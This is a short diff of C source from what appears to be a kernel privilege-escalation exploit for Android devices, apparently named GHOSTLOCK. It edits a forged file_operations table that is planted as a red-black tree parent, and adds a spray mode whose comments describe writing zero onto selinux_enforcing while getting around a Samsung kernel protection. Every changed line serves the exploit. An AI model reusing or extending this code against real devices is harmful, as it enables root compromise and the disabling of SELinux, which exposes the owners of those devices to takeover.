@@ -454,8 +454,12 @@ void put_fake_fops_table(unsigned char *p, size_t off) {
   g_swap_staged = swap_stage1;
   if (clone_fops || clone_cfg || swap_stage1) {
     put64(p, off + FOPS_OWNER_OFF, 0);
+    /* SLIDE_SWAP: fake_fops IS the rb parent. change_child writes
+     * rb_right/rb_left (+8/+0x10 = llseek/read). A real llseek JT there
+     * gets clobbered; N11 then died in open() on the uuid ashmem node.
+     * NULL llseek/read are valid (vfs falls through to read_iter). */
     put64(p, off + FOPS_LLSEEK_OFF,
-          runtime_text_sym(a_ash_llseek, a_llseek));
+          swap_stage1 ? 0 : runtime_text_sym(a_ash_llseek, a_llseek));
 #ifdef GHOSTLOCK_KERNEL_5_10
     /* 5.10: configfs bin fns are .read/.write style (see table note below). */
     put64(p, off + FOPS_READ_OFF,
@@ -1324,7 +1328,15 @@ int prepare_skb_payload(uintptr_t base, int payload_mode) {
         use_classic = 0;
       else if (tgt == misc_p0)
         use_classic = 1;
-      if (env_flag("MODE4_WPROOF_SPRAY", 0)) {
+      if (env_flag("MODE4_SLIDE_ZERO", 0) || env_flag("MODE4_DATAONLY", 0)) {
+        /* Stack stamp writes 0. Heap only-left parent=fake_fops onto
+         * selinux_enforcing stores a kernel pointer there (Samsung
+         * EMERALD: non-NULL STORE = KP). Keep W0.pi an empty black leaf. */
+        write_pc = 1;
+        write_right = 0;
+        write_left = 0;
+        pr_info("mode4 ZERO/DATAONLY W0.pi inert 1,0,0 (stack writes 0)\n");
+      } else if (env_flag("MODE4_WPROOF_SPRAY", 0)) {
         /* Placement oracle: marker write inside our own sprayed table. */
         use_classic = 0;
         write_pc = fake_fops + 0x80; /* parent_color = VALUE (page addr) */
